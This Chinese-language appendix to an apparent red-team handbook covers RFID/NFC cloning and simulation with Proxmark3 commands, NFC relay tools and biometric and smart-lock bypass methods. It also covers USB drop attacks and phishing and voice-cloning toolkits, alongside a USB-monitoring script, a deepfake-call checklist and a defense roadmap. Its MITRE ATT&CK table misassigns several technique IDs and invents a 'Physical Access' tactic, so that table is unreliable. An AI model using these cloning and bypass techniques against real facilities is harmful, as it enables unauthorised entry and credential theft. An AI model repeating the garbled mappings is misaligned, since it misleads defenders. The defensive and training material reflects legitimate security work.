# MIFARE DESFire EV2/EV3 支持
pm3 → hf mfdes info                # DESFire 卡片信息
pm3 → hf mfdes enum                # 枚举应用
pm3 → hf mfdes getuid              # 获取UID
pm3 → hf mfdes format              # 格式化卡片(需要认证)

# ST25TB 系列支持 (新增)
pm3 → hf st25tb info               # ST25TB 卡片信息
pm3 → hf st25tb dump               # 转储数据
pm3 → hf st25tb restore            # 恢复到新卡

# iCLASS 增强恢复
pm3 → hf iclass info               # 增强的iCLASS检测
pm3 → hf iclass dump --ki 0        # 更快的密钥恢复
pm3 → hf iclass simulate --ki 0    # 更稳定的模拟

# 模拟性能改善
pm3 → hf mf sim --uid <uid>        # 更稳定的Mifare模拟
pm3 → hf 14a sim --uid <uid>       # ISO14443A模拟改善
```

#### C.2.2 RFID/NFC 工具生态 2025 更新矩阵

```
=== RFID/NFC 物理安全测试工具生态 (2025-2026) ===

| 工具              | 类型       | 最新版本    | 核心能力                          | 适用场景           |
|-------------------|-----------|-------------|----------------------------------|-------------------|
| Proxmark3 RDV4    | 专业级     | Iceman 2025.06 | LF/HF全协议/DESFire/iCLASS/ST25TB | 专业渗透测试       |
| Chameleon Ultra   | 中级       | Rev1.2      | MFC密钥恢复/Darkside/Nested/中继攻击 | 快速卡片操作       |
| Flipper Zero      | 入门级     | 1.4.x       | Sub-GHz/RFID/NFC/IR/BadUSB/GPIO   | 多协议快速侦察      |
| Keysy             | 便携级     | Gen2        | 125kHz/13.56MHz克隆              | 现场快速克隆        |
| HydraBus          | 开源       | v1.0+       | 多协议嗅探/SPI/I2C/UART/CAN       | 协议逆向           |
| NFCGate           | 中继攻击   | v2.0+       | NFC中继/实时转发                  | 门禁中继攻击测试    |

=== Proxmark3 vs Chameleon Ultra vs Flipper Zero 选择指南 ===

Proxmark3 RDV4:
  优势: 最全协议支持/最深度分析/专业级/社区活跃
  劣势: 价格高(~$200-300)/需要笔记本连接/学习曲线陡
  最佳: 专业渗透测试和深度RFID安全审计

Chameleon Ultra:
  优势: 独立运行/MFC密钥恢复/中继攻击/便携
  劣势: 仅NFC/无低频/协议覆盖有限
  最佳: 快速Mifare操作和便携场景

Flipper Zero:
  优势: 多功能(Sub-GHz/IR/BadUSB)/独立运行/社区大
  劣势: NFC能力弱于专用工具/无DESFire/无中继
  最佳: 通用侦察和入门级测试

=== 2025 RFID 攻击技术演进 ===

1. 中继攻击 (Relay Attack) 增强版
   - NFCGate v2: 支持实时NFC中继
   - 攻击距离: 理论无限制 (网络传输)
   - 防御: 距离边界检测 (Distance Bounding)
   - 目标: MIFARE DESFire / 支付系统 / 门禁

2. MIFARE DESFire EV3 攻击面
   - 侧信道攻击: 功耗分析提取密钥
   - 协议降级: 尝试降级到EV1
   - 应用层: 默认密钥/弱密钥检测

3. 移动设备 NFC 安全
   - Android Host-based Card Emulation
   - Apple Express Card 模式安全分析
   - NFC 支付令牌克隆检测
```

### C.3 物理安全测试新技术

#### C.3.1 高级门禁绕过技术

```bash
# === 2025 高级门禁系统绕过技术 ===

# 1. OSDP (Open Supervised Device Protocol) 攻击
# OSDP v2 使用 AES-128 加密, 但存在部署弱点
# 检查点:
# - OSDP 是否配置为加密模式 (OSDP Secure Channel)?
# - 密钥是否为默认密钥?
# - RS-485 总线是否可物理访问?

# 2. 移动凭证 (Mobile Credential) 攻击面
# HID Mobile Access / Salto KS / Brivo
# 攻击向量:
# - 蓝牙中继攻击 (BLE Relay)
# - 移动设备克隆
# - 云API认证绕过
# - NFC/蓝牙降级攻击

# 3. 生物识别门禁绕过
# 指纹:
# - 指纹模具制作 (导电硅胶 + 指纹图像)
# - 断层攻击 (呈现模具覆盖真指纹)
# 工具: 3D打印机 + 导电材料

# 面部识别:
# - 红外照片攻击 (某些系统仅用可见光)
# - 3D面具 (树脂/硅胶制作)
# - 手机屏幕重放 (部分系统漏洞)
# 注意: 现代系统使用3D深度检测+活体检测

# 4. 智能锁 IoT 攻击
# - 蓝牙锁: BLE嗅探+重放 (Flipper Zero)
# - WiFi锁: 默认密码/固件漏洞
# - Z-Wave/Zigbee: 协议级别攻击
# - 键盘锁: 按键磨损分析/热成像/肩窥
```

#### C.3.2 USB 投放攻击演进

```bash
# === 2025 USB 投放攻击演进 ===

# 传统USB Rubber Ducky已不够, 现代防御包括:
# - USB端口禁用 (GPO)
# - DLP软件监控
# - 端点检测 (EDR)
# - USB设备白名单

# 绕过技术:
# 1. HID伪装 (键盘/鼠标)
#    - BadUSB: 伪装为键盘执行命令
#    - 使用USB-C/Lightning适配器增加兼容性
#    - 检测: USB设备描述符分析

# 2. 网络适配器伪装
#    - USB以太网适配器 (自动安装)
#    - Responder + NTLM中继
#    - 检测: 网络接口变更监控

# 3. 信用卡/礼品卡外观
#    - 超薄USB设备伪装为信用卡
#    - 投放于停车场/前台
#    - 标签: "礼品卡" / "奖金名册"

# 4. 充电站攻击 (Juice Jacking)
#    - USB充电站植入数据线
#    - 同时充电+数据传输
#    - 防御: 仅使用充电线 (无数据引脚)

# === Bash Bunny Mark II 更新 ===
# Hak5 Bash Bunny Mark II:
# - 双USB接口 (可同时连接两台设备)
# - 以太网 + USB 组合攻击
# - 预置多种攻击模块
# - 新增: WiFi Pineapple集成

# === 检测与防御脚本 ===
cat << 'DETECTION' > usb_monitor.sh
#!/bin/bash
# 监控USB设备插入事件
# 适用于 Linux 端点

inotifywait -m /dev/bus/usb 2>/dev/null | while read path action file; do
    echo "[USB EVENT] $(date): $action $path$file"
    # 记录USB设备详情
    lsusb 2>/dev/null >> /var/log/usb_audit.log
    # 检查HID设备 (可能的BadUSB)
    cat /sys/bus/usb/devices/*/product 2>/dev/null | grep -i "keyboard\|mouse" >> /var/log/usb_audit.log
done
DETECTION
```

### C.4 社会工程防御与意识培训 2025-2026 更新

#### C.4.1 AI 增强的安全意识培训平台

```
=== 安全意识培训平台 2025-2026 更新 ===

| 平台              | 最新功能                                    | AI能力                    |
|-------------------|--------------------------------------------|--------------------------|
| KnowBe4           | AI Phishing模拟/深度伪造语音钓鱼/实时风险评分 | AI生成个性化钓鱼模板      |
| Hoxhunt           | 自适应学习路径/实时威胁情报集成              | AI行为分析+个性化培训      |
| Proofpoint (Wombat)| 深度伪造视频钓鱼模拟/SMiShing模拟          | AI调整攻击难度            |
| Cofense           | 威胁情报驱动钓鱼模拟/自动化报告             | AI邮件分析+风险评分       |
| Hook Security     | 心理学驱动培训/行为改变追踪                 | AI分析员工风险画像        |
| Infosec IQ        | 深度伪造钓鱼模拟/多渠道(邮件/短信/语音)     | AI个性化内容生成          |

=== 深度伪造钓鱼模拟关键要素 ===

[2025 培训最佳实践]
1. 多渠道覆盖: 邮件 + 语音 + 短信 + 物理投放 + 视频会议
2. AI个性化: 根据员工角色/部门/历史表现定制攻击
3. 实时反馈: 点击后立即显示教育内容 (30秒微培训)
4. 深度伪造专题: 专门训练识别AI生成的语音/视频
5. 量化指标: 风险评分 / 点击率 / 报告率 / 改善趋势

[关键KPI 2025基准]
- 钓鱼邮件点击率: 行业平均 15-20%, 最佳 < 5%
- 深度伪造语音识别率: 目标 > 80%
- 可疑行为报告率: 目标 > 70%
- 培训完成率: 目标 100%
- 平均报告时间: 目标 < 10分钟
```

#### C.4.2 深度伪造检测工具

```bash
# === 深度伪造检测工具集 ===

# 语音深度伪造检测
# 1. AI语音检测API
# - ElevenLabs AI Speech Classifier
# - Resemble Detect
# - Pindrop (商用, 通话中心级)
# - Nuance Voice Biometrics

# 2. 开源检测工具
# - AASIST (Anti-spoofing with attention and self-supervised learning)
# - Wav2Vec2-based detection models (HuggingFace)
# - RawNet2 / RawGAT-ST (反语音合成)

# 视频深度伪造检测
# - DeepFake Detection Challenge (DFDC) 模型
# - Microsoft Video Authenticator
# - Intel FakeCatcher (商用)
# - Sensity AI (商用)

# === 通话中实时检测清单 ===
cat << 'EOF'
== 深度伪造语音通话实时检测清单 ==

[技术检测]
[ ] 呼叫方ID是否与已知号码匹配?
[ ] 通话中是否有不自然的停顿或延迟?
[ ] 声音质量是否与正常通话一致?
[ ] 是否有异常的背景噪音或不一致?
[ ] 音调/语速是否与该人物正常模式一致?

[行为检测]
[ ] 来电者是否在非正常时间拨打?
[ ] 是否要求紧急/非常规操作?
[ ] 是否拒绝通过其他渠道确认身份?
[ ] 是否要求绕过正常安全流程?
[ ] 是否知道只有内部人员才知道的信息?

[验证步骤]
[ ] 要求对方提供员工编号/部门代码
[ ] 通过官方通讯录回拨确认
[ ] 使用预先约定的安全暗号
[ ] 与该人员的直接上级确认
[ ] 如果涉及转账, 启动双因素确认流程
EOF
```

### C.5 2025-2026 综合速查与工具更新

#### C.5.1 社会工程工具生态更新

```
=== 社会工程工具生态 2025-2026 ===

钓鱼平台:
  - GoPhish v0.12.1: 开源, 支持Evilginx集成
  - Evilginx Pro v4.3: Botguard/Evilpuppet/反检测
  - King Phisher: 开源, 支持自定义模板
  - SpeedPhish Framework (SPF): 快速部署

语音钓鱼:
  - Evilginx + VoIP: AiTM + Vishing组合
  - Twilio/Plivo API: 大规模语音钓鱼
  - 语音克隆: ElevenLabs/OpenVoice/Tortoise-TTS

物理工具:
  - Proxmark3 Iceman 2025: RFID/NFC全面分析
  - Chameleon Ultra Rev1.2: 便携Mifare操作
  - Flipper Zero 1.4.x: 多协议通用工具
  - Bash Bunny Mark II: USB攻击升级版
  - WiFi Pineapple: 无线钓鱼专用

OSINT工具:
  - theHarvester: 多源信息收集
  - SpiderFoot: 自动化OSINT
  - Maltego: 可视化关系分析
  - Recon-ng: 模块化侦察框架
  - Sherlock: 社交媒体账号查找

新工具:
  - ElevenLabs Voice Cloning API (测试用)
  - HeyGen (深度伪造视频生成, 测试用)
  - NFCGate v2 (NFC中继攻击)
```

### C.6 中文社区精华参考

```
=== 中文社区社会工程/物理安全精华 ===

[通用参考]
1. 奇安信《2024-2025 安全威胁态势报告》- 社会工程攻击占比分析
2. FreeBuf - 多篇社会工程实战文章, 含钓鱼、vishing、物理渗透
3. 先知社区 - 钓鱼邮件制作、GoPhish部署、Evilginx实战
4. 腾讯云 - 企业级安全意识培训最佳实践
5. 安全客 - AI深度伪造钓鱼攻击分析与防御
6. 看雪论坛 - RFID/NFC安全分析, Proxmark3实战教程
7. 吾爱破解 - 物理安全评估经验分享
8. 阿里云安全 - 钓鱼防护、邮件安全网关配置
9. 火绒安全 - 企业端USB防护与意识培训
10. 长亭科技 - 社会工程在红队行动中的应用

[关键数据点]
- 2025年中国企业钓鱼邮件点击率: 约18-25% (行业平均)
- 深度伪造语音攻击同比增长超300%
- AI生成钓鱼邮件识别难度显著增加
- 物理渗透测试成功率仍保持50-70%
```

### C.7 防御升级路线图

```
=== 社会工程与物理安全防御路线图 P0-P3 ===

[P0 - 立即 (0-30天)]
[ ] 部署AI语音钓鱼检测 (呼叫中心/前台)
[ ] 启用多因素身份验证 (所有关键系统)
[ ] 建立大额转账双渠道确认流程
[ ] 发布深度伪造攻击紧急安全通告
[ ] 检查RFID门禁系统是否使用加密协议

[P1 - 短期 (1-3个月)]
[ ] 实施深度伪造钓鱼模拟培训 (语音+视频)
[ ] 部署USB端口控制策略 (白名单模式)
[ ] 升级Wiegand协议为OSDP v2加密
[ ] 实施访客管理系统自动化
[ ] 部署物理入侵检测系统 (PIDS)
[ ] 建立"安全暗号"机制 (高管团队)

[P2 - 中期 (3-6个月)]
[ ] 全面安全意识培训计划 (含AI威胁)
[ ] 门禁系统升级到MIFARE DESFire EV3/Seos
[ ] 实施视频分析AI异常行为检测
[ ] 建立红队定期SE评估流程 (季度)
[ ] 部署SIEM物理安全告警集成
[ ] 开展深度伪造视频会议攻击演练

[P3 - 长期 (6-12个月)]
[ ] 建立SOC+物理安全联合运营中心
[ ] 实施零信任物理访问 (持续验证)
[ ] AI驱动的实时威胁狩猎 (社会工程向量)
[ ] 生物识别+行为分析双因素门禁
[ ] 供应链社会工程风险评估
[ ] 年度红队全面社会工程评估
```

### C.8 MITRE ATT&CK v18/v19 扩展映射

```
=== MITRE ATT&CK 扩展映射 (v18/v19) ===

新增/更新技术:
| 战术             | 技术    | 子技术    | 本手册覆盖                   |
|------------------|---------|-----------|------------------------------|
| Initial Access   | T1566   | .003      | C.1 深度伪造语音钓鱼         |
| Initial Access   | T1566   | .002      | C.1 深度伪造视频会议钓鱼     |
| Credential Access| T1189   | -         | C.1 AI语音克隆凭证钓鱼       |
| Defense Evasion  | T1036   | .001      | C.1 深度伪造身份伪装         |
| Discovery        | T1082   | -         | C.3 USB投放+系统侦察         |
| Execution        | T1204   | .002      | C.3 BadUSB/恶意文件执行      |
| Physical Access  | T1192   | -         | C.2 RFID克隆/中继攻击        |
| Persistence      | T1133   | -         | C.3 USB持久化                |
| Collection       | T1114   | -         | C.1 深度伪造钓鱼页面凭证收集 |
| Command & Control| T1132   | -         | C.1 AI语音通道作为C2         |

 Stealth子战术 (v19新增):
| T1036.001        | Invalid Code Signature  | 伪造数字签名增强可信度    |
| T1036.005        | Match Legitimate Name   | 匹配合法名称/品牌        |

Defense Impairment子战术 (v19新增):
| T1562.001        | Impair Defenses: Disable Tools | USB投放禁用安全软件  |
```
